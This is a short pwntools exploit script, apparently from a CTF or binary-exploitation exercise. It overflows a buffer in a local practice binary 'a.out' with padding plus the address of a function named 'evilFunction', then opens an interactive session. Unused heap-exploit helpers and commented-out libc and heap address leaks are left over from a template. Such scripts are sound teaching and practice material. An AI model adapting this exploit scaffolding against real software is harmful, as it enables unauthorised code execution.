#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("a.out")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

## This binary leaks the address of puts(), use it to resolve the libc load address.
#io.recvuntil(b"puts() @ ")
#libc.address = int(io.recvline(), 16) - libc.sym.puts
#
## This binary leaks the heap start address.
#io.recvuntil(b"heap @ ")
#heap = int(io.recvline(), 16)
#io.recvuntil(b"> ")
#io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=
evilFunctionAddress = elf.symbols['evilFunction']

io.recvuntil(b"Input: ")
io.send(b"5")
io.sendafter(b"This is a good function and doesnt hurt you: ", b"A"*20 + p64(evilFunctionAddress))



# =============================================================================

io.interactive()
